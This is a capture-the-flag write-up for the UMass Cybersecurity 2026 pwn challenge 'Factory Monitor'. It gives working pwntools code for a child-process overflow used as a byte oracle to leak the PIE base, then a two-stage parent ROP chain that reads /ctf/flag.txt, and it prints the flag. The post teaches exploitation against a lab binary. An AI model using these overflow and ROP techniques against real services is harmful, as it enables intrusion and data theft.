:::caution
Spoilers ahead. This post includes solution details, payloads, and flags.
:::

UMass Cybersecurity 2026 gave me a pwn challenge that felt much bigger than its interface. `Factory Monitor` looked like a simple machine-management CLI, but the real trick was to stop thinking about one process at a time. Once I treated the parent and child processes as one connected exploit surface, the solve became much cleaner.

This post focuses on a single challenge: `Factory Monitor`.

---

## [Pwn] Factory Monitor

`Factory Monitor` is a two-stage exploit built around process inheritance. I did not get a clean memory leak from one obvious bug. Instead, I used one stack overflow in the child process as an oracle to recover the parent process PIE base, then used a second overflow in the parent to run a full ORW chain and read the flag file.

### What made this challenge interesting

Three details made the challenge click for me:

- the service managed forked child processes from one long-lived parent
- there were two separate stack overflows
- the hint pointed directly at inheritance between parent and child

That meant the child bug was not only useful for crashing a worker. It was useful because the child inherited the same PIE base as the parent for the whole live session.

### The behavior I saw first

The CLI exposed commands like these:

```text
create / start / send / recv / monitor / cleanup
```

Each machine was a forked child with pipes back to the parent. The key mental model was:

1. one TCP connection keeps the parent alive
2. child machines are started and restarted from that parent
3. the parent PIE base stays fixed during the session
4. the child inherits that same layout basis

That made byte-by-byte brute force realistic, because I could keep the same parent alive while restarting children as many times as I needed.

### Vulnerabilities I used

I ended up using two unsafe reads through the same line-reading helper:

- **child overflow** in the machine callback path
- **parent overflow** in `cli_recv`

The important offsets were:

- child saved RIP offset: `0x118`
- parent saved RIP offset: `0x138`

That already suggested a two-phase solve: use the easier child crash path for information first, then spend the recovered address data on the real parent exploit.

### Background knowledge

#### Why inheritance matters here

Forked children inherit a lot of state from their parent, including the same already-randomized memory layout. So if I can learn one useful address inside a child, I can often recover the parent PIE base too.

#### Why I used ORW instead of `system("cat ...")`

The challenge gave me a strong ROP surface, and the Docker setup showed the flag at `/ctf/flag.txt`. In this kind of binary, open-read-write is usually the cleanest path:

1. `open("/ctf/flag.txt", 0, 0)`
2. `read(fd, buf, size)`
3. `write(1, buf, size)`

That avoids depending on a shell command parser and keeps the exploit closer to the binary’s own imported functions.

---

## Step-by-step solve

### Step 1: Set up one machine and keep one live connection

I started with a small pwntools wrapper and one live connection:

```python
from pwn import *
import re, time

HOST, PORT = "factory-monitor.pwn.ctf.umasscybersec.org", 45000
io = remote(HOST, PORT)

PROMPT = b"choice? "
START_RE = re.compile(rb"Machine process (\d+) started")

def recv_prompt(timeout=3):
    return io.recvuntil(PROMPT, timeout=timeout)

def cmd(line: bytes):
    io.sendline(line)
    return recv_prompt()
```

Then I created and started one machine:

```python
print(cmd(b"create m 1").decode("latin-1", "replace"))
out = cmd(b"start 0")
print(out.decode("latin-1", "replace"))
```

The exact machine commands were not the hard part. The important part was keeping the whole leak phase inside one connection so the parent process stayed stable.

### Step 2: Turn the child overflow into a byte oracle

The first exploit stage targeted the child callback return path. I overflowed the child stack with:

```text
A * 272 + saved rbp filler + guessed RIP prefix
```

In code:

```python
payload = b"A" * 272 + b"A" * 8 + prefix
```

Then I forced the callback path with this sequence:

1. `send 0 <payload>`
2. `recv 0 200`
3. `recv 0 200`
4. `send 0 fail`
5. `recv 0 200`
6. `monitor 0`

The goal was to steer RIP to `base + 0xb457`, a useful location near the child return path. The nice part was the oracle:

- correct byte guess → child exits with **status 65**
- wrong byte guess → crash or different process event

So I brute-forced bytes of `addr(base + 0xb457)` one by one.

The heart of that leak loop was:

```python
found = bytearray([0x57])
for idx in range(1, 6):
    hit = None
    for g in range(256):
        if g == 0x0A:
            continue
        verdict, event, pid = attempt(bytes(found) + bytes([g]), pid)
        if verdict == "status" and b"status 65" in event:
            hit = g
            print(f"[+] byte{idx}=0x{g:02x}")
            break
    if hit is None:
        hit = 0x0A
        print(f"[+] byte{idx}=0x0a (inferred)")
    found.append(hit)

found.extend(b"\x00\x00")
addr_b457 = u64(bytes(found))
base = addr_b457 - 0xB457
```

Recovered result:

```text
addr_b457 = 0x7fbea14c7457
base      = 0x7fbea14bc000
```

That was the key transition point of the challenge. Once the base was known, the parent overflow became reliable instead of blind.

### Step 3: Build a two-stage parent ROP chain

With PIE solved, I used the parent overflow at offset `0x138`.

The plan was:

- **stage 1**: call `read(0, stage2_addr, 0x500)` and pivot the stack
- **stage 2**: run ORW to open `/ctf/flag.txt`, read it, and write it back to stdout

The offsets I used from the PIE base were:

```text
pop rdi ; pop rbp ; ret = 0xc028
pop rsi ; pop rbp ; ret = 0x15b26
pop rdx ; xor eax,eax ; ... ; ret = 0x836dc
pop rsp ; ret = 0x51468
xchg edi,eax ; ret = 0x841c6
open  = 0x38a40
read  = 0x38ba0
write = 0x38c40
```

I placed stage 2 in writable memory at `base + 0xc8000`.

Stage 1 looked like this:

```python
stage1  = b"A" * 0x138
stage1 += A(POP_RDI_RBP) + p64(0) + p64(0)
stage1 += A(POP_RSI_RBP) + p64(stage2_addr) + p64(0)
stage1 += A(POP_RDX) + p64(0x500) + p64(0) + p64(0) + p64(0) + p64(0)
stage1 += A(READ)
stage1 += A(POP_RSP) + p64(stage2_addr)
```

Stage 2 built the ORW chain and appended the path string:

```python
stage2  = b""
stage2 += A(POP_RDI_RBP) + p64(path_addr) + p64(0)
stage2 += A(POP_RSI_RBP) + p64(0) + p64(0)
stage2 += A(POP_RDX) + p64(0) + p64(0) + p64(0) + p64(0) + p64(0)
stage2 += A(OPEN)
stage2 += A(XCHG_EDI_EAX)
stage2 += A(POP_RSI_RBP) + p64(buf_addr) + p64(0)
stage2 += A(POP_RDX) + p64(0x100) + p64(0) + p64(0) + p64(0) + p64(0)
stage2 += A(READ)
stage2 += A(POP_RDI_RBP) + p64(1) + p64(0)
stage2 += A(POP_RSI_RBP) + p64(buf_addr) + p64(0)
stage2 += A(POP_RDX) + p64(0x100) + p64(0) + p64(0) + p64(0) + p64(0)
stage2 += A(WRITE)
stage2  = stage2.ljust(0x300, b"\x00") + b"/ctf/flag.txt\x00"
```

### Step 4: Trigger the parent overflow in the right order

The ordering mattered a lot. That was one of the easiest places to get stuck.

The sequence that worked was:

```python
cmd(b"start 0")
cmd(b"send 0 " + stage1)
cmd(b"recv 0 200")

io.sendline(b"recv 0 200")
time.sleep(0.08)
io.send(stage2)
```

Why this order matters:

- the first `recv` only consumes the short echo line
- the second `recv` is the one that processes the long payload and returns into stage 1
- stage 2 must be fed immediately after stage 1’s `read(0, ...)` starts waiting

Once that timing was right, the returned data contained the flag.

### Step 5: Read the output and extract the flag

I kept receiving until I saw the expected pattern:

```python
data = b""
end = time.time() + 8
while time.time() < end:
    try:
        chunk = io.recv(timeout=0.25)
    except EOFError:
        break
    if not chunk:
        continue
    data += chunk
    if b"UMASS{" in data:
        break
```

Final result:

:::note[Flag]
`UMASS{AsLR_L3Ak}`
:::

---

## Why the solve worked

What I like about this challenge is that the two bugs are not independent. The child overflow is useful because it gives me information about the parent’s session layout. The parent overflow is useful because it turns that information into full file-read capability.

So the solve is really one chain:

1. abuse child inheritance to recover PIE base
2. use that base to build a stable parent ROP chain
3. read `/ctf/flag.txt` with ORW

That is also why the hint was so good. It did not spoil the challenge, but it pointed directly at the mental model I needed.

### Concept map

```mermaid
mindmap
  root((Factory Monitor))
    Setup
      one live TCP connection
      parent process stays alive
      children are forked from parent
    Child stage
      child stack overflow
      use monitor as oracle
      correct guess gives status 65
      recover address of base plus b457
      compute PIE base
    Parent stage
      parent stack overflow at cli_recv
      stage 1 calls read and pivots stack
      stage 2 runs open read write chain
    Final result
      open /ctf/flag.txt
      read flag into buffer
      write flag to stdout
      UMASS AsLR L3Ak
```



## Troubleshooting notes

- If the leak loop never finds a hit, check that you are matching **`status 65`** exactly.
- Keep the leak in one live connection. Restarting the whole connection loses the stable parent state you are trying to learn from.
- Do not place byte `0x0a` directly into line payloads, because newline input handling will break the attempt.
- If stage 2 hangs, check the order again: the second `recv` must trigger the stage 1 return before raw stage 2 bytes are sent.

## References

- [pwntools documentation](https://docs.pwntools.com/) - scripting and remote interaction used throughout the solve
- [ROP Emporium guide](https://ropemporium.com/guide.html) - good reference for basic ROP workflow and stack control
- [Linux `fork(2)` manual page](https://man7.org/linux/man-pages/man2/fork.2.html) - helpful background for inherited process state

## Closing notes

`Factory Monitor` was a very satisfying challenge. It did not ask for one lucky gadget or one huge trick. It asked for a clean exploit story: learn the layout from the child, then spend that information carefully in the parent. Once I understood that structure, the whole challenge felt much more elegant.
